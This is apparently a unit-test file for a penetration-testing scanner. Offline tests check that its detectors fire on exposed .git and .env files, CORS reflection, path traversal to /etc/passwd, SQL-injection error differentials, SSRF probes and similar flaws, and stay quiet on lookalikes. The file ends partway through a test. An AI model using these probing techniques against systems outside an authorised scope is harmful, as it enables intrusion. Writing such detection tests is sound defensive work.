"""Detection tests. Offline only - canned responses, no sockets, no live targets.

Each test asserts both directions: the check fires on the real condition, and
stays silent on the benign lookalike. The negative half is the one that keeps
the tool usable.
"""

from __future__ import annotations

import sys
import unittest
from urllib.parse import parse_qs, urlsplit

sys.path.insert(0, __file__.rsplit("/tests/", 1)[0])

from tests.stub import (SOFT404_BODY, make_ctx, path_route, titles, web_target)

PASSWD = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"


class ExposureTests(unittest.TestCase):
    def test_git_head_detected(self):
        from assay.modules.web_exposure import ExposureModule
        ctx, _ = make_ctx([
            path_route("/.git/HEAD", body="ref: refs/heads/main\n"),
            path_route("/.git/config", body="[core]\n\trepositoryformatversion = 0\n"),
        ])
        found = ExposureModule().run_web(ctx, web_target())
        self.assertIn("Exposed .git repository", titles(found))
        git = next(f for f in found if f.title == "Exposed .git repository")
        # The follow-up fetch of .git/config must promote it to confirmed.
        self.assertEqual(git.confidence, "confirmed")
        self.assertTrue(git.evidence, "a finding must carry evidence")
        self.assertTrue(git.impact, "a finding must state attacker impact")

    def test_soft404_shell_produces_nothing(self):
        """An SPA answering 200 HTML for every path must not yield findings."""
        from assay.modules.web_exposure import ExposureModule
        ctx, _ = make_ctx([])          # every path hits the 200 HTML catch-all
        found = ExposureModule().run_web(ctx, web_target())
        self.assertEqual(found, [], "soft-404 shell produced false positives: %s"
                         % titles(found))

    def test_env_html_error_page_not_reported(self):
        """A themed 'not found' HTML page containing the word DB_PASSWORD."""
        from assay.modules.web_exposure import ExposureModule
        body = ("<html><title>404 Not Found</title><body>No such file: "
                "DB_PASSWORD=example</body></html>")
        ctx, _ = make_ctx([path_route("/.env", ctype="text/html", body=body)])
        found = ExposureModule().run_web(ctx, web_target())
        self.assertNotIn("Exposed .env file", titles(found))

    def test_env_detected_as_plaintext(self):
        from assay.modules.web_exposure import ExposureModule
        ctx, _ = make_ctx([path_route(
            "/.env", body="APP_KEY=base64:x\nDB_PASSWORD=hunter2\n")])
        found = ExposureModule().run_web(ctx, web_target())
        self.assertIn("Exposed .env file", titles(found))
        self.assertEqual(found[0].severity, "critical")


class DirListingTests(unittest.TestCase):
    def test_index_of_detected(self):
        from assay.modules.web_exposure import DirListingModule
        listing = ("<html><head><title>Index of /backup</title></head><body>"
                   "<h1>Index of /backup</h1><a href='../'>Parent Directory</a>"
                   "<a href='db.sql'>db.sql</a></body></html>")
        ctx, _ = make_ctx([path_route("/backup/", ctype="text/html", body=listing)])
        found = DirListingModule().run_web(ctx, web_target())
        self.assertEqual(len(found), 1)
        # /backup is on the sensitive list, so it must outrank a plain /assets hit.
        self.assertEqual(found[0].severity, "medium")

    def test_no_listing_no_finding(self):
        from assay.modules.web_exposure import DirListingModule
        ctx, _ = make_ctx([])
        self.assertEqual(DirListingModule().run_web(ctx, web_target()), [])


class CorsTests(unittest.TestCase):
    @staticmethod
    def _reflecting(creds: bool):
        def route(m, url, h, b):
            origin = h.get("Origin")
            hdrs = {"Content-Type": "application/json"}
            if origin:
                hdrs["Access-Control-Allow-Origin"] = origin
                if creds:
                    hdrs["Access-Control-Allow-Credentials"] = "true"
            return 200, hdrs, '{"email":"a@b.c","token":"x"}'
        return route

    def test_reflected_origin_with_credentials(self):
        from assay.modules.web_headers import CorsModule
        ctx, _ = make_ctx([self._reflecting(True)])
        found = CorsModule().run_web(ctx, web_target())
        t = titles(found)
        self.assertIn("CORS reflects arbitrary Origin with credentials allowed", t)
        f = found[0]
        self.assertEqual(f.confidence, "confirmed")
        self.assertEqual(f.severity, "high")
        # Two distinct sentinel origins must both have been reflected.
        self.assertGreaterEqual(len(f.evidence), 2)

    def test_static_acao_is_not_reflection(self):
        """A fixed ACAO for a partner origin must not be called reflection."""
        from assay.modules.web_headers import CorsModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "application/json",
                         "Access-Control-Allow-Origin": "https://partner.example.org",
                         "Access-Control-Allow-Credentials": "true"}, "{}"
        ctx, _ = make_ctx([route])
        found = CorsModule().run_web(ctx, web_target())
        self.assertEqual(found, [], "static ACAO misreported: %s" % titles(found))

    def test_wildcard_without_sensitive_data_is_quiet(self):
        from assay.modules.web_headers import CorsModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "application/json",
                         "Access-Control-Allow-Origin": "*"}, '{"status":"ok"}'
        ctx, _ = make_ctx([route])
        self.assertEqual(CorsModule().run_web(ctx, web_target()), [])


class OpenRedirectTests(unittest.TestCase):
    @staticmethod
    def _redirector(param="next"):
        def route(m, url, h, b):
            parts = urlsplit(url)
            if parts.path != "/login":
                return None
            q = parse_qs(parts.query)
            if param not in q:
                return None
            return 302, {"Location": q[param][0]}, ""
        return route

    def test_open_redirect_from_crawled_url(self):
        from assay.modules.web_active import OpenRedirectModule
        origin = "http://target.test:8080"
        ctx, _ = make_ctx([self._redirector()],
                          urls={origin: [origin + "/login?next=/dashboard"]})
        found = OpenRedirectModule().run_web(ctx, web_target())
        self.assertTrue(found, "open redirect on a crawled URL was missed")
        self.assertEqual(found[0].confidence, "confirmed")
        self.assertIn("next", found[0].title)

    def test_relative_redirect_is_not_open(self):
        """Redirecting to a fixed internal path must never be reported."""
        from assay.modules.web_active import OpenRedirectModule

        def route(m, url, h, b):
            if urlsplit(url).path != "/login":
                return None
            return 302, {"Location": "/dashboard"}, ""
        origin = "http://target.test:8080"
        ctx, _ = make_ctx([route], urls={origin: [origin + "/login?next=/dashboard"]})
        self.assertEqual(OpenRedirectModule().run_web(ctx, web_target()), [])


class TraversalTests(unittest.TestCase):
    def test_passwd_oracle(self):
        from assay.modules.web_active import TraversalModule

        def route(m, url, h, b):
            parts = urlsplit(url)
            if parts.path != "/download":
                return None
            q = parse_qs(parts.query)
            if "etc/passwd" in (q.get("file", [""])[0]):
                return 200, {"Content-Type": "text/plain"}, PASSWD
            return None
        origin = "http://target.test:8080"
        ctx, _ = make_ctx([route], urls={origin: [origin + "/download?file=report.pdf"]})
        found = TraversalModule().run_web(ctx, web_target())
        self.assertTrue(found, "path traversal with a /etc/passwd oracle was missed")
        self.assertEqual(found[0].severity, "critical")
        self.assertEqual(found[0].confidence, "confirmed")

    def test_reflected_payload_without_file_contents(self):
        """Echoing the payload back is not a file read."""
        from assay.modules.web_active import TraversalModule

        def route(m, url, h, b):
            q = parse_qs(urlsplit(url).query)
            return 200, {"Content-Type": "text/html"}, \
                "<p>No such file: %s</p>" % q.get("file", [""])[0]
        origin = "http://target.test:8080"
        ctx, _ = make_ctx([route], urls={origin: [origin + "/download?file=x"]})
        self.assertEqual(TraversalModule().run_web(ctx, web_target()), [])


class HostHeaderTests(unittest.TestCase):
    def test_xfh_reflection(self):
        from assay.modules.web_active import HostHeaderModule

        def route(m, url, h, b):
            xfh = h.get("X-Forwarded-Host")
            if not xfh:
                return None
            return 200, {"Content-Type": "text/html",
                         "Cache-Control": "public, max-age=60"}, \
                "<a href='https://%s/reset'>reset</a>" % xfh
        ctx, _ = make_ctx([route])
        found = HostHeaderModule().run_web(ctx, web_target())
        self.assertTrue(found)
        self.assertEqual(found[0].confidence, "confirmed")
        self.assertIn("cache", found[0].tags)

    def test_no_reflection_no_finding(self):
        from assay.modules.web_active import HostHeaderModule
        ctx, _ = make_ctx([])
        self.assertEqual(HostHeaderModule().run_web(ctx, web_target()), [])


class GraphQLTests(unittest.TestCase):
    def test_introspection(self):
        from assay.modules.web_active import GraphQLModule
        schema = ('{"data":{"__schema":{"queryType":{"name":"Query"},'
                  '"mutationType":{"name":"Mutation"},"types":[{"name":"User"}]}}}')
        ctx, _ = make_ctx([path_route("/graphql", ctype="application/json",
                                      body=schema, method="POST")])
        found = GraphQLModule().run_web(ctx, web_target())
        self.assertTrue(found)
        # A mutation root means state-changing operations are enumerable.
        self.assertEqual(found[0].severity, "medium")

    def test_introspection_disabled(self):
        from assay.modules.web_active import GraphQLModule
        ctx, _ = make_ctx([path_route(
            "/graphql", ctype="application/json", method="POST",
            body='{"errors":[{"message":"introspection is disabled"}]}')])
        self.assertEqual(GraphQLModule().run_web(ctx, web_target()), [])


class SecretsTests(unittest.TestCase):
    def test_aws_key_and_sourcemap(self):
        from assay.modules.secrets import SecretsModule
        js = ('var API="https://billing.internal:8443/api";\n'
              'var k="AKIAIOSFODNN7EXAMPLE";\n'
              '//# sourceMappingURL=app.js.map\n')
        smap = '{"version":3,"sources":["src/admin/Secret.tsx"],"sourcesContent":["x"]}'
        ctx, _ = make_ctx([
            path_route("/", ctype="text/html",
                       body='<html><script src="/static/app.js"></script></html>'),
            path_route("/static/app.js", ctype="application/javascript", body=js),
            path_route("/static/app.js.map", ctype="application/json", body=smap),
        ])
        found = SecretsModule().run_web(ctx, web_target())
        t = titles(found)
        self.assertIn("AWS access key id exposed in client-side asset", t)
        self.assertIn("JavaScript source map published in production", t)
        self.assertIn("Internal hosts referenced from client-side JavaScript", t)

    def test_clean_bundle_is_quiet(self):
        from assay.modules.secrets import SecretsModule
        ctx, _ = make_ctx([
            path_route("/", ctype="text/html",
                       body='<html><script src="/static/app.js"></script></html>'),
            path_route("/static/app.js", ctype="application/javascript",
                       body='function f(){return 1}'),
        ])
        self.assertEqual(SecretsModule().run_web(ctx, web_target()), [])


class ScoringTests(unittest.TestCase):
    def test_confirmed_critical_outranks_tentative_critical(self):
        from assay.models import Evidence, Finding
        confirmed = Finding(title="a", target="t", severity="critical",
                            confidence="confirmed", impact="x",
                            evidence=[Evidence(kind="http")])
        tentative = Finding(title="b", target="t", severity="critical",
                            confidence="tentative", impact="x",
                            evidence=[Evidence(kind="http")])
        self.assertGreater(confirmed.compute_score(), tentative.compute_score())
        self.assertEqual(confirmed.triage, "CHASE")

    def test_evidence_free_finding_is_damped(self):
        from assay.models import Evidence, Finding
        with_ev = Finding(title="a", target="t", severity="high", confidence="firm",
                          impact="x", evidence=[Evidence(kind="http")])
        without = Finding(title="a", target="t", severity="high", confidence="firm",
                          impact="x")
        self.assertGreater(with_ev.compute_score(), without.compute_score() * 2)

    def test_hygiene_finding_never_reaches_chase(self):
        from assay.models import Evidence, Finding
        f = Finding(title="Security headers absent", target="t", severity="info",
                    confidence="firm", impact="x", tags=["noise-prone"],
                    evidence=[Evidence(kind="http")])
        f.compute_score()
        self.assertEqual(f.triage, "NOTE")


class ScopeTests(unittest.TestCase):
    def test_wildcard_cidr_and_deny(self):
        from assay.config import Scope
        s = Scope(allow=["*.target.tld", "10.0.0.0/8"], deny=["nope.target.tld"])
        self.assertTrue(s.allows("api.target.tld"))
        self.assertTrue(s.allows("10.1.2.3"))
        self.assertFalse(s.allows("nope.target.tld"))
        self.assertFalse(s.allows("evil.tld"))
        self.assertFalse(s.allows("target.tld.evil.tld"))

    def test_out_of_scope_request_is_blocked(self):
        from assay.config import Config, Scope
        from assay.net import HttpClient
        cfg = Config(scope=Scope(allow=["target.tld"]))
        r = HttpClient(cfg).get("https://evil.tld/")
        self.assertEqual(r.error, "out-of-scope")
        self.assertEqual(r.status, 0)


class RedactionTests(unittest.TestCase):
    SAMPLE = (
        "https://admin.acmebank.com:8443/x (10.42.7.13)\n"
        "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.sig\n"
        "DB_PASSWORD=Sup3rS3cret\naws_access_key_id=AKIAIOSFODNN7EXAMPLE\n"
        "jane.doe@acmebank.com  415-555-0199\n"
        "root:x:0:0:root:/root:/bin/bash\n/home/jsmith/app\n"
        "https://owasp.org/ref\n"
    )

    def _redactor(self):
        from assay.redact import Redactor, terms_from_context
        return Redactor(extra_terms=terms_from_context(
            ["https://admin.acmebank.com"], ["*.acmebank.com"], ["10.42.7.13"]))

    def test_no_residual_leaks(self):
        r = self._redactor()
        self.assertEqual(r.verify(r.text(self.SAMPLE)), [])

    def test_reference_domains_survive(self):
        r = self._redactor()
        self.assertIn("owasp.org", r.text(self.SAMPLE))

    def test_pseudonyms_are_stable_and_reversible(self):
        r = self._redactor()
        out = r.text(self.SAMPLE)
        self.assertEqual(out, r.text(self.SAMPLE))
        self.assertIn("acmebank.com", r.map.rehydrate(out))
        self.assertNotIn("acmebank", out)

    def test_payload_gate_blocks_on_leak(self):
        """A term the redactor does not know must be caught by verify()."""
        from assay.redact import Redactor
        r = Redactor(extra_terms=[])
        leaked = "contact ops at internal-jump.corpnet.example-client.tld"
        self.assertTrue(r.verify(leaked), "verify() failed to flag a bare hostname")

    def test_ai_payload_refuses_to_build_with_leaks(self):
        from assay.ai import AIConfig, build_payload
        from assay.models import Evidence, Finding
        from assay.redact import Redactor
        f = [Finding(title="x", target="https://a.acmebank.com/", severity="high",
                     impact="y", evidence=[Evidence(kind="http", output="10.9.9.9")])]
        payload, leaks = build_payload(f, {}, AIConfig(include_evidence=True), Redactor())
        blob = str(payload)
        self.assertNotIn("acmebank.com", blob)
        self.assertNotIn("10.9.9.9", blob)
        self.assertEqual(leaks, [])


class NucleiFilterTests(unittest.TestCase):
    def test_fingerprint_templates_dropped(self):
        from assay.modules.web_nuclei import NucleiModule
        m = NucleiModule()
        for tid in ("tech-detect", "waf-detect", "http-missing-security-headers"):
            self.assertIsNone(m._convert({"template-id": tid,
                                          "info": {"severity": "info"}}), tid)

    def test_real_finding_converted(self):
        from assay.modules.web_nuclei import NucleiModule
        f = NucleiModule()._convert({
            "template-id": "git-config-exposure",
            "matched-at": "https://t/.git/config",
            "response": "[core]",
            "info": {"name": "Git Config", "severity": "high",
                     "tags": ["exposure", "config"],
                     "classification": {"cwe-id": ["cwe-200"]}}})
        self.assertIsNotNone(f)
        self.assertEqual(f.severity, "high")
        self.assertTrue(f.evidence[0].response)




class InstallerTests(unittest.TestCase):
    """The planner is exercised against a simulated Kali box.

    The real target environment (apt + go present) cannot be reproduced on the
    development machine, so _has() and the tool inventory are stubbed to prove
    the plan is correct for the environment assay actually ships to.
    """

    def _plan(self, have_apt=True, have_go=True, present=(), constrained=False,
              only=None):
        from assay import installer
        from assay.env import Resources

        binaries = {"apt-get": have_apt, "go": have_go}
        orig_has, orig_avail, orig_res, orig_gopath = (
            installer._has, installer.tools.available,
            installer.env.resources, installer.gopath_bin)
        installer._has = lambda b: binaries.get(b, b in present)
        installer.tools.available = lambda: {
            n: ("/usr/bin/" + n if n in present else None)
            for n in installer.tools.REGISTRY}
        # constrained is (cpus <= 2 or mem_avail < 2048), so both must move.
        installer.env.resources = lambda: Resources(
            cpus=2 if constrained else 8,
            mem_total_mb=2048 if constrained else 16384,
            mem_avail_mb=900 if constrained else 8000)
        installer.gopath_bin = lambda: "/root/go/bin"
        try:
            return installer.build_plan(only=only)
        finally:
            (installer._has, installer.tools.available,
             installer.env.resources, installer.gopath_bin) = (
                orig_has, orig_avail, orig_res, orig_gopath)

    def test_kali_plan_covers_apt_and_go(self):
        plan = self._plan()
        cmds = [s.display() for s in plan.steps]
        self.assertTrue(any("apt-get update" in c for c in cmds))
        install = next(c for c in cmds if "apt-get install" in c)
        for pkg in ("nmap", "ffuf", "seclists", "arjun"):
            self.assertIn(pkg, install)
        self.assertTrue(any("nuclei" in c and "go install" in c for c in cmds))
        self.assertEqual(plan.unsupported, [])
        self.assertEqual(plan.path_hint, "/root/go/bin")

    def test_already_installed_tools_are_skipped(self):
        plan = self._plan(present=("nmap", "nuclei", "ffuf"))
        self.assertNotIn("nmap", plan.missing)
        self.assertIn("nmap", plan.already)
        cmds = " ".join(s.display() for s in plan.steps)
        self.assertNotIn("nuclei@latest", cmds)
        self.assertNotIn("nuclei -update-templates", cmds)

    def test_nothing_to_do_yields_empty_plan(self):
        plan = self._plan(present=tuple(
            __import__("assay.tools", fromlist=["REGISTRY"]).REGISTRY))
        self.assertTrue(plan.empty)

    def test_post_install_only_for_queued_tools(self):
        """nuclei's template update must not run when go is unavailable."""
        plan = self._plan(have_apt=False, have_go=False)
        cmds = " ".join(s.display() for s in plan.steps)
        self.assertNotIn("update-templates", cmds)
        self.assertTrue(plan.empty)

    def test_nuclei_templates_queued_when_installable(self):
        plan = self._plan(only=["nuclei"])
        cmds = [s.display() for s in plan.steps]
        self.assertTrue(any("update-templates" in c for c in cmds))

    def test_constrained_vm_pins_single_compiler_process(self):
        plan = self._plan(constrained=True, only=["httpx"])
        build = next(s for s in plan.steps if "build" in s.label)
        self.assertEqual(build.env_extra.get("GOFLAGS"), "-p=1")
        self.assertTrue(any("single" in n for n in plan.notes))

    def test_unconstrained_host_does_not_pin_goflags(self):
        plan = self._plan(constrained=False, only=["httpx"])
        build = next(s for s in plan.steps if "build" in s.label)
        self.assertEqual(build.env_extra, {})

    def test_go_toolchain_installed_first_when_absent(self):
        plan = self._plan(have_go=False, only=["httpx"])
        labels = [s.label for s in plan.steps]
        self.assertIn("install the Go toolchain", labels)
        self.assertLess(labels.index("install the Go toolchain"),
                        labels.index("build httpx"))

    def test_root_needs_no_sudo(self):
        from assay import installer
        orig = installer._sudo_needed
        installer._sudo_needed = lambda: False
        try:
            plan = self._plan(only=["nmap"])
            self.assertFalse(any(s.needs_sudo for s in plan.steps))
        finally:
            installer._sudo_needed = orig

    def test_registry_holds_only_tools_that_get_used(self):
        """Installing a tool nobody calls wastes build time on a small VM."""
        from assay import tools
        self.assertNotIn("gowitness", tools.REGISTRY)
        self.assertNotIn("puredns", tools.REGISTRY)

    def test_non_debian_is_reported_not_attempted(self):
        plan = self._plan(have_apt=False, have_go=True, only=["nmap"])
        self.assertIn("nmap", plan.unsupported)
        self.assertEqual(plan.steps, [])
        self.assertTrue(any("non-Debian" in n for n in plan.notes))


class ReflectionTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"

    def _ctx(self, transform):
        """transform(reflected_value) -> what the page renders."""
        def route(m, url, h, b):
            q = parse_qs(urlsplit(url).query)
            val = q.get("q", [""])[0]
            return 200, {"Content-Type": "text/html"}, transform(val)
        return make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/s?q=x"]})

    def test_raw_html_reflection_is_high(self):
        from assay.modules.web_reflect import ReflectionModule
        ctx, _ = self._ctx(lambda v: "<html><body><p>%s</p></body></html>" % v)
        found = ReflectionModule().run_web(ctx, web_target())
        self.assertTrue(found)
        self.assertEqual(found[0].severity, "high")
        self.assertIn("HTML body text", found[0].detail)

    def test_fully_encoded_reflection_is_not_reported(self):
        from assay.modules.web_reflect import ReflectionModule
        import html as _h
        ctx, _ = self._ctx(lambda v: "<p>%s</p>" % _h.escape(v, quote=True)
                           .replace("`", "&#96;").replace("(", "&#40;")
                           .replace(")", "&#41;").replace("{", "&#123;")
                           .replace("}", "&#125;").replace(";", "&#59;"))
        self.assertEqual(ReflectionModule().run_web(ctx, web_target()), [])

    def test_no_reflection_no_finding(self):
        from assay.modules.web_reflect import ReflectionModule
        ctx, _ = self._ctx(lambda v: "<p>static page</p>")
        self.assertEqual(ReflectionModule().run_web(ctx, web_target()), [])

    def test_json_response_is_not_a_browser_sink(self):
        """Reflection into an application/json body is not XSS."""
        from assay.modules.web_reflect import ReflectionModule

        def route(m, url, h, b):
            q = parse_qs(urlsplit(url).query)
            return 200, {"Content-Type": "application/json"}, \
                '{"q":"%s"}' % q.get("q", [""])[0]
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/s?q=x"]})
        self.assertEqual(ReflectionModule().run_web(ctx, web_target()), [])

    def test_script_context_with_quotes_is_high(self):
        from assay.modules.web_reflect import ReflectionModule
        ctx, _ = self._ctx(
            lambda v: "<html><script>var a=\"%s\";</script></html>"
            % v.replace("<", "&lt;").replace(">", "&gt;"))
        found = ReflectionModule().run_web(ctx, web_target())
        self.assertTrue(found)
        self.assertEqual(found[0].severity, "high")
        self.assertIn("script", found[0].detail.lower())


class SqliTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"
    MYSQL_ERR = ("You have an error in your SQL syntax; check the manual that "
                 "corresponds to your MySQL server version")

    def test_error_differential_fires(self):
        from assay.modules.web_sqli import SqliModule

        def route(m, url, h, b):
            v = parse_qs(urlsplit(url).query).get("id", [""])[0]
            broken = v.count("'") % 2 == 1
            body = self.MYSQL_ERR if broken else "<p>Product 1</p>"
            return 200, {"Content-Type": "text/html"}, body
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/p?id=1"]})
        found = SqliModule().run_web(ctx, web_target())
        self.assertTrue(found, "error differential missed")
        self.assertEqual(found[0].severity, "critical")
        self.assertEqual(len(found[0].evidence), 2)

    def test_page_that_always_errors_is_not_reported(self):
        """A permanently broken page is not an injection point."""
        from assay.modules.web_sqli import SqliModule

        def route(m, url, h, b):
            return 200, {"Content-Type": "text/html"}, self.MYSQL_ERR
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/p?id=1"]})
        self.assertEqual(SqliModule().run_web(ctx, web_target()), [])

    def test_error_text_without_differential_is_not_reported(self):
        """Error appears for both broken and balanced quotes -> not injection."""
        from assay.modules.web_sqli import SqliModule

        def route(m, url, h, b):
            v = parse_qs(urlsplit(url).query).get("id", [""])[0]
            body = self.MYSQL_ERR if "'" in v else "<p>ok</p>"
            return 200, {"Content-Type": "text/html"}, body
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/p?id=1"]})
        self.assertEqual(SqliModule().run_web(ctx, web_target()), [])

    def test_boolean_inference_requires_stable_baseline(self):
        """An endpoint whose output changes every request must be skipped."""
        from assay.modules.web_sqli import SqliModule
        counter = {"n": 0}

        def route(m, url, h, b):
            counter["n"] += 1
            return 200, {"Content-Type": "text/html"}, \
                "<p>random %d %s</p>" % (counter["n"], "x" * counter["n"])
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/p?id=1"]})
        self.assertEqual(SqliModule().run_web(ctx, web_target()), [])


class SsrfTests(unittest.TestCase):
    ORIGIN = "http://target.test:8080"

    def test_inband_fetch_error_is_tentative(self):
        from assay.modules.web_ssrf import SsrfModule
        from assay.oob import OOBSession
        import tempfile

        def route(m, url, h, b):
            if "url=" in url:
                return 200, {"Content-Type": "text/html"}, \
                    "cURL error 6: Could not resolve host"
            return None
        ctx, _ = make_ctx([route], urls={self.ORIGIN: [self.ORIGIN + "/f?url=x"]})
        ctx.oob = OOBSession(tempfile.mkdtemp(), domain="c.oastify.com")
        ctx.oob.start()
        found = SsrfModule().run_web(ctx, web_target())
        self.assertTrue(found)
        self.assertEqual(found[0].confidence, "tentative")
        self.assertEqual(found[0].category[:3], "A10")

    def test_no_oob_backend_means_no_probe(self):
        from assay.modules.web_ssrf import SsrfModule
        ctx, http = make_ctx([], urls={self.ORIGIN: [self.ORIGIN + "/f?url=x"]})
        ctx.oob = None
        self.assertEqual(SsrfModule().run_web(ctx, web_target()), [])

    def test_ledger_records_every_payload_fired(self):
        from assay.oob import OOBSession
        import tempfile, os
        s = OOBSession(tempfile.mkdtemp(), domain="c.oastify.com")
        s.start()
        pid, host = s.payload("https://t/x param=url")
        self.assertIn(pid, host)
        path = s.flush_ledger()
        self.assertTrue(os.path.exists(path))
        self.assertIn(pid, open(path).read())
        self.assertIsNone(s.seen(pid), "ledger mode must never claim a callback")


class HostDeepTests(unittest.TestCase):
    def test_rules_fire_only_on_the_true_condition(self):
        from assay.modules.host_deep import load_rules
        rules = {r["script"]: r for r in load_rules()}
        cases = [
            ("ftp-anon", "Anonymous FTP login allowed (FTP code 230)", True),
            ("ftp-anon", "530 login incorrect", False),
            ("smb2-security-mode", "Message signing enabled but not required", True),
            ("smb2-security-mode", "Message signing enabled and required", False),
            ("smb-enum-shares", "Anonymous access: READ/WRITE", True),
            ("smb-enum-shares", "Anonymous access: <none>", False),
            ("rdp-enum-encryption", "CredSSP (NLA): FAILED", True),
            ("rdp-enum-encryption", "CredSSP (NLA): SUCCESS", False),
            ("smtp-open-relay", "Server is an open relay (16/16 tests)", True),
            ("smtp-open-relay", "Server doesn't seem to be an open relay", False),
            ("mysql-empty-password", "root account has empty password", True),
            ("mysql-empty-password", "All accounts require a password", False),
        ]
        for script, output, expected in cases:
            fired = bool(rules[script]["_re"].search(output))
            self.assertEqual(fired, expected, "%s on %r" % (script, output))

    def test_finding_carries_evidence_and_a_next_step(self):
        from assay.modules.host_deep import HostDeepModule, load_rules
        rule = next(r for r in load_rules() if r["script"] == "ftp-anon")
        f = HostDeepModule()._finding(rule, "10.0.0.9", 21,
                                      "Anonymous FTP login allowed", "Anonymous FTP")
        self.assertEqual(f.confidence, "confirmed")
        self.assertTrue(f.evidence and f.evidence[0].output)
        self.assertIn("10.0.0.9", f.repro)
        self.assertTrue(f.impact)


class SurfaceTests(unittest.TestCase):
    def test_vhost_requires_divergence_from_both_baselines(self):
        """A catch-all server that answers everything identically yields nothing."""
        from assay import recon
        ctx, http = make_ctx([])       # every request returns the same shell
        hits = recon.vhost_probe(http, "http://target.test:8080/",
                                 ["dev.target.test", "api.target.test"])
        self.assertEqual(hits, [])

    def test_vhost_detected_when_response_differs(self):
        from assay import recon

        def route(m, url, h, b):
            if h.get("Host", "").startswith("dev."):
                return 200, {"Content-Type": "text/html"}, \
                    "<html><h1>Staging control panel</h1>" + ("filler " * 60) + "</html>"
            return None
        ctx, http = make_ctx([route])
        hits = recon.vhost_probe(http, "http://target.test:8080/",
                                 ["dev.target.test", "api.target.test"])
        self.assertEqual([n for n, _ in hits], ["dev.target.test"])

    def test_origin_requires_a_cdn_in_front(self):
        """No CDN means there is nothing to bypass."""
        from assay import recon
        ctx, http = make_ctx([])
        self.assertIsNone(recon.origin_exposed(http, "target.test", "1.2.3.4"))

    def test_cdn_detection(self):
        from assay.recon import detect_cdn
        from assay.net import Resp
        r = Resp(url="x", status=200, headers={"CF-Ray": "abc"}, body="", elapsed=0)
        self.assertEqual(detect_cdn(r), "cloudflare")
        self.assertEqual(detect_cdn(Resp(url="x", status=200,
                                         headers={"Server": "nginx"},
                                         body="", elapsed=0)), "")


class UrlSourcingTests(unittest.TestCase):
    def test_js_extraction_separates_local_from_foreign(self):
        from assay.urls import extract_from_js
        js = ('fetch("/api/v2/me");var C="https://cdn.other.tld/x.js";'
              'var A="https://target.test/v1/orders";var m="application/json";'
              'var i="/logo.png";')
        local, foreign = extract_from_js(js, "https://target.test/a.js", "target.test")
        self.assertIn("https://target.test/api/v2/me", local)
        self.assertIn("https://target.test/v1/orders", local)
        self.assertEqual(foreign, ["https://cdn.other.tld/x.js"])
        joined = " ".join(local)
        self.assertNotIn("application/json", joined)
        self.assertNotIn("logo.png", joined)

    def test_dedupe_collapses_id_variants(self):
        from assay.urls import dedupe_by_shape
        urls = ["https://t/x?id=%d" % i for i in range(50)] + ["https://t/y?a=1&b=2"]
        self.assertEqual(len(dedupe_by_shape(urls, 100)), 2)

    def test_assets_are_not_injection_points(self):
        from assay.urls import dedupe_by_shape
        self.assertEqual(dedupe_by_shape(
            ["https://t/a.png", "https://t/b.css", "https://t/c.woff2"], 10), [])

    def test_hidden_params_are_appended(self):
        from assay.urls import with_params
        got = with_params("https://t/x?id=1", ["debug", "id", "admin"])
        self.assertIn("debug=1", got)
        self.assertIn("admin=1", got)
        self.assertEqual(got.count("id="), 1, "existing param must not duplicate")


class BasicAuthTests(unittest.TestCase):
    def test_header_is_set_and_shared_with_tools(self):
        from assay.config import Config
        from assay import tools
        cfg = Config(basic_auth="admin:s3cret")
        self.assertEqual(cfg.request_headers()["Authorization"],
                         "Basic YWRtaW46czNjcmV0")
        self.assertEqual(tools.header_args("nuclei",
                                           {"Authorization": cfg.auth_header()}),
                         ["-H", "Authorization: Basic YWRtaW46czNjcmV0"])

    def test_absent_by_default(self):
        from assay.config import Config
        self.assertIsNone(Config().auth_header())
        self.assertNotIn("Authorization", Config().request_headers())


class WindowsWslBridgeTests(unittest.TestCase):
    """assay hosted on Windows, external scanners executed inside WSL."""

    def setUp(self):
        from assay import env
        self._name = env.os.name
        self._state = dict(env._WSL_STATE)
        self._paths = dict(env._PATH_CACHE)

    def tearDown(self):
        from assay import env
        env.os.name = self._name
        env._WSL_STATE.clear(); env._WSL_STATE.update(self._state)
        env._PATH_CACHE.clear(); env._PATH_CACHE.update(self._paths)

    def _windows(self, gateway=None):
        from assay import env
        env.os.name = "nt"
        env._WSL_STATE.update(checked=True, ok=True, distro="kali-linux",
                              **({"gateway": gateway} if gateway else {}))
        env._PATH_CACHE.clear()
        return env

    def test_native_host_is_untouched(self):
        from assay import tools
        self.assertEqual(tools.bridge(["nmap", "-sV"]), ["nmap", "-sV"])

    def test_commands_are_wrapped_for_wsl(self):
        self._windows()
        from assay import tools
        self.assertEqual(tools.bridge(["nuclei", "-silent"]),
                         ["wsl.exe", "-d", "kali-linux", "--", "nuclei", "-silent"])

    def test_windows_paths_translate_to_wsl_mounts(self):
        env = self._windows()
        self.assertEqual(env.to_wsl_path(r"C:\Users\me\out\raw\nmap.xml"),
                         "/mnt/c/Users/me/out/raw/nmap.xml")

    def test_loopback_proxy_is_rewritten_to_the_windows_host(self):
        """A WSL-side tool proxying to 127.0.0.1 would miss Burp entirely."""
        self._windows(gateway="172.28.16.1")
        from assay import tools
        self.assertEqual(tools.proxy_args("nuclei", "http://127.0.0.1:8080"),
                         ["-proxy", "http://172.28.16.1:8080"])
        self.assertEqual(tools.proxy_args("ffuf", "http://localhost:8080"),
                         ["-x", "http://172.28.16.1:8080"])

    def test_explicit_proxy_address_is_left_alone(self):
        self._windows(gateway="172.28.16.1")
        from assay import tools
        self.assertEqual(tools.proxy_args("nuclei", "http://192.168.1.50:8080"),
                         ["-proxy", "http://192.168.1.50:8080"])

    def test_no_proxy_stays_no_proxy(self):
        self._windows(gateway="172.28.16.1")
        from assay import tools
        self.assertEqual(tools.proxy_args("nuclei", None), [])

    def test_sudo_check_does_not_crash_without_geteuid(self):
        """os.geteuid does not exist on Windows."""
        from assay import installer
